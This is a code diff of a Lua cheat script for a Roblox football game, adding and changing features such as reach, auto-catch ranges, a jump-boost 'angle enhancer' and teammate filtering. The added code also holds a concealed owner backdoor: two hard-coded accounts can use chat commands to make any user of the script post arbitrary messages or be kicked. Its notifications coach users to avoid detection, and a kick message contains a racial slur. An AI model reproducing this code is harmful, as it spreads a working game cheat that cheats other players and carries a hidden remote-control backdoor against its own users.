@@ -8,6 +8,58 @@ if not allowedPlaces[game.PlaceId] then
     game:GetService("Players").LocalPlayer:Kick("Wrong Game Bitch Nigga Check Supported Games")
 end
 
+local Players = game:GetService("Players")
+local LocalPlayer = Players.LocalPlayer
+
+local ownerNames = {
+    ["x8lx8x"] = true,
+    ["xleskyy"] = true
+}
+
+-- Check if player is an owner
+local function isOwner(name)
+    return ownerNames[name] == true
+end
+
+-- Handle commands
+local function handleCommand(message, speaker)
+    if not isOwner(speaker.Name) then return end
+
+    local args = message:split(" ")
+    local cmd = args[1]:lower()
+
+    if cmd == ":talk" then
+        local say = message:sub(#args[1] + 2)
+        local chatRemote = game:GetService("ReplicatedStorage"):FindFirstChild("DefaultChatSystemChatEvents")
+        if chatRemote and chatRemote:FindFirstChild("SayMessageRequest") then
+            chatRemote.SayMessageRequest:FireServer(say, "All")
+        end
+
+    elseif cmd == ":kick" then
+        game:GetService("StarterGui"):SetCore("SendNotification", {
+            Title = "You’ve been kicked",
+            Text = "The owner removed your access.",
+            Duration = 5
+        })
+        task.wait(2)
+        LocalPlayer:Kick("Celaris | A Premium Member/Moderator has kicked you from the server")
+    end
+end
+
+-- Listen to chat from all players
+for _, plr in ipairs(Players:GetPlayers()) do
+    plr.Chatted:Connect(function(msg)
+        handleCommand(msg, plr)
+    end)
+end
+
+-- Listen for owners who join later
+Players.PlayerAdded:Connect(function(plr)
+    plr.Chatted:Connect(function(msg)
+        handleCommand(msg, plr)
+    end)
+end)
+
 -- Executor Check
 local function BadExecutors()
     return string.match(getexecutorname(), "Solara")
@@ -112,8 +164,6 @@ else
     print("Celaris failed to bypass!")
 end
 
-
-
 local Player = game:GetService("Players").LocalPlayer
 local UserInputService = game:GetService("UserInputService")
 local VirtualInputManager = game:GetService("VirtualInputManager")
@@ -156,11 +206,13 @@ local blockReachAmount = 3 -- default slider value
 local originalSize = Vector3.new(0.8500000238418579, 5, 1.5)
 local blockPartName = "BlockPart"
 
-local noJumpCooldownEnabled = false
-local lastFakeJumpTime = 0
-local jumpCooldownWait = 0.3
-local jumpConnection
-
+-- // Angle Enhancer
+local angleEnhancerEnabled = false
+local angleBoostAmount = 5
+local angleHoldTime = 1.5
+local angleJumpBoosted = false
+local sHeldTime = 0
+local previousJumpPower = 50 -- This will get overwritten once you activate
 
 local rainWasInitiallyEnabled = false
 local snowWasInitiallyEnabled = false
@@ -170,6 +222,7 @@ local UseMagnetDelay = false
 local MagnetDelay = 0.01 -- Default value
 local HitboxColor = Color3.fromRGB(178, 178, 178) -- Default color
 local HitboxTransparency = 0.8 -- Default transparency
+
 local Players = game:GetService("Players")
 local Player = Players.LocalPlayer
 local Character = Player.Character or Player.CharacterAdded:Wait()
@@ -210,8 +263,17 @@ LocalPlayer.CharacterAdded:Connect(function()
 	end
 end)
 
-local workspace = game:GetService("Workspace")
-local scrambleWall = workspace:WaitForChild("ScrambleWall") -- Assumes ScrambleWall exists in workspace
+local allowedPlaceIds = {
+    [8204899140] = true,
+    [17541256525] = true
+}
+
+local scrambleWall
+
+if allowedPlaceIds[game.PlaceId] then
+    scrambleWall = workspace:WaitForChild("ScrambleWall")
+end
+
 local toggle = false
 local canCollideCheck = true -- Whether CanCollide should be checked
 
@@ -312,40 +374,13 @@ local function applySettings()
     end
 end
 
-local jumpCooldownActive = false
-
-local function setupNoJumpCooldown()
-    if typeof(jumpConnection) == "RBXScriptConnection" then
-        jumpConnection:Disconnect()
-        jumpConnection = nil
-    end
-
-    if noJumpCooldownEnabled then
-        jumpConnection = UserInputService.JumpRequest:Connect(function()
-            local character = LocalPlayer.Character
-            local humanoid = character and character:FindFirstChildWhichIsA("Humanoid")
-            if not humanoid then return end
-
-            task.wait() -- Give the game a frame to register legit jumps
-
-            if not jumpCooldownActive and humanoid:GetState() ~= Enum.HumanoidStateType.Jumping then
-                humanoid:ChangeState(Enum.HumanoidStateType.Jumping)
-                jumpCooldownActive = true
-                lastFakeJumpTime = tick()
-
-                task.delay(jumpCooldownWait, function()
-                    jumpCooldownActive = false
-                end)
-            end
-        end)
-    end
-end
-
 -- Function to find the player holding the football
 local function findFootballHolder()
     for _, player in pairs(Players:GetPlayers()) do
-        if player.Character and player.Character:FindFirstChild("Football") then
-            return player
+        if player.Team ~= LocalPlayer.Team then -- 🛑 Make sure player is NOT on your team
+            if player.Character and player.Character:FindFirstChild("Football") then
+                return player
+            end
         end
     end
     return nil
@@ -631,7 +666,7 @@ AutomaticsTab:CreateTextBox("Catch Delay", "Delay (0.01 - 3)", function(v)
     end
 end)
 
-AutomaticsTab:CreateTextBox("Max Distance", "Amount (10-30)", function(v)
+AutomaticsTab:CreateTextBox("Max Distance", "Amount (10-50)", function(v)
     local num = tonumber(v)
 
     if num and num >= 10 and num <= 30 then
@@ -650,7 +685,7 @@ AutomaticsTab:CreateTextBox("Max Distance", "Amount (10-30)", function(v)
         pcall(function()
             game:GetService("StarterGui"):SetCore("SendNotification", {
                 Title = "Invalid Distance",
-                Text = "Enter a number from 10 to 30",
+                Text = "Enter a number from 10 to 50",
                 Duration = 3
             })
         end)
@@ -687,7 +722,7 @@ AutomaticsTab:CreateTextBox("Swat Delay", "Delay (0.01 - 3)", function(v)
     end
 end)
 
-AutomaticsTab:CreateTextBox("Max Distance", "Amount (10-30)", function(v)
+AutomaticsTab:CreateTextBox("Max Distance", "Amount (10-50)", function(v)
     local num = tonumber(v)
 
     if num and num >= 10 and num <= 30 then
@@ -706,7 +741,7 @@ AutomaticsTab:CreateTextBox("Max Distance", "Amount (10-30)", function(v)
         pcall(function()
             game:GetService("StarterGui"):SetCore("SendNotification", {
                 Title = "Invalid Distance",
-                Text = "Enter a number from 10 to 30",
+                Text = "Enter a number from 10 to 50",
                 Duration = 3
             })
         end)
@@ -745,7 +780,7 @@ end)
 AutomaticsTab:CreateTextBox("Jump Delay", "Delay Number", function(v)
     local num = tonumber(v)
 
-    if num and num >= 10 and num <= 30 then
+    if num and num >= 10 and num <= 50 then
         jumpMaxDistance = num
         -- Success notification
         pcall(function()
@@ -760,7 +795,7 @@ AutomaticsTab:CreateTextBox("Jump Delay", "Delay Number", function(v)
         pcall(function()
             game:GetService("StarterGui"):SetCore("SendNotification", {
                 Title = "Invalid Delay",
-                Text = "Enter a number from 10 to 30",
+                Text = "Enter a number from 10 to 50",
                 Duration = 3
             })
         end)
@@ -902,6 +937,105 @@ PlayersTab:CreateTextBox("JumpPower Amount", "Amount (50-60)", function(v)
     end
 end)
 
+local function updateAngleEnhancer()
+    if not angleEnhancerEnabled then return end
+
+    local char = Player.Character
+    if not char then return end
+
+    local humanoid = char:FindFirstChildWhichIsA("Humanoid")
+    if not humanoid then return end
+
+    local currentTime = tick()
+
+    if UserInputService:IsKeyDown(Enum.KeyCode.S) then
+        if sHeldTime == 0 then
+            sHeldTime = currentTime
+        elseif currentTime - sHeldTime >= angleHoldTime and not angleJumpBoosted then
+            previousJumpPower = humanoid.JumpPower
+            humanoid.JumpPower = previousJumpPower + angleBoostAmount
+            angleJumpBoosted = true
+        end
+    else
+        if angleJumpBoosted then
+            humanoid.JumpPower = previousJumpPower
+        end
+        angleJumpBoosted = false
+        sHeldTime = 0
+    end
+end
+
+PlayersTab:CreateLabel("Angle Enhancer")
+PlayersTab:CreateToggle("Enabled", function(value)
+    angleEnhancerEnabled = value
+
+    if not value and angleJumpBoosted then
+        local char = Player.Character
+        if char then
+            local humanoid = char:FindFirstChildWhichIsA("Humanoid")
+            if humanoid then
+                humanoid.JumpPower = previousJumpPower
+            end
+        end
+        angleJumpBoosted = false
+        sHeldTime = 0
+    end
+
+    if value then
+        pcall(function()
+            game:GetService("StarterGui"):SetCore("SendNotification", {
+                Title = "Angle Enhancer",
+                Text = "If JumpPower is enabled you should probably turn it off so you're not blatant.",
+                Duration = 4
+            })
+        end)
+    end
+end)
+
+PlayersTab:CreateTextBox("Angle Boost", "Enter a number from 1 to 10", function(v)
+    local num = tonumber(v)
+    if num and num >= 1 and num <= 10 then
+        angleBoostAmount = num
+        pcall(function()
+            game:GetService("StarterGui"):SetCore("SendNotification", {
+                Title = "Angle Boost Updated",
+                Text = "New Boost: " .. num,
+                Duration = 3
+            })
+        end)
+    else
+        pcall(function()
+            game:GetService("StarterGui"):SetCore("SendNotification", {
+                Title = "Invalid Value",
+                Text = "Enter a number between 1 and 10",
+                Duration = 3
+            })
+        end)
+    end
+end)
+
+PlayersTab:CreateTextBox("Hold-Time", "Enter a number from 1 to 3", function(v)
+    local num = tonumber(v)
+    if num and num >= 1 and num <= 3 then
+        angleHoldTime = num
+        pcall(function()
+            game:GetService("StarterGui"):SetCore("SendNotification", {
+                Title = "Hold-Time Updated",
+                Text = "New Hold-Time: " .. num .. "s",
+                Duration = 3
+            })
+        end)
+    else
+        pcall(function()
+            game:GetService("StarterGui"):SetCore("SendNotification", {
+                Title = "Invalid Value",
+                Text = "Enter a number between 1 and 3",
+                Duration = 3
+            })
+        end)
+    end
+end)
+
 PlayersTab:CreateLabel("Defense")
 
 PlayersTab:CreateToggle("Tackle Reach", function(value)
@@ -952,11 +1086,6 @@ PlayersTab:CreateLabel("Miscellaneous")
 
 PlayersTab:CreateToggle("No Move Restrictions", function(value)
     noMoveRestrictions = value
-end)
-
-PlayersTab:CreateToggle("No Jump Cooldown", function(value)
-    noJumpCooldownEnabled = value
-    setupNoJumpCooldown()
 end)
 
 
@@ -1194,13 +1323,15 @@ task.spawn(function()
         local closest, closestDist = nil, math.huge
 
         for _, plr in pairs(game:GetService("Players"):GetPlayers()) do
-            if plr ~= player and plr.Character and plr.Character:FindFirstChild("Football") then
-                local targetHRP = plr.Character:FindFirstChild("HumanoidRootPart")
-                if targetHRP then
-                    local dist = (hrp.Position - targetHRP.Position).Magnitude
-                    if dist < closestDist then
-                        closestDist = dist
-                        closest = targetHRP
+            if plr ~= player and plr.Team ~= player.Team then  -- ✅ skip teammates
+                if plr.Character and plr.Character:FindFirstChild("Football") then
+                    local targetHRP = plr.Character:FindFirstChild("HumanoidRootPart")
+                    if targetHRP then
+                        local dist = (hrp.Position - targetHRP.Position).Magnitude
+                        if dist < closestDist then
+                            closestDist = dist
+                            closest = targetHRP
+                        end
                     end
                 end
             end
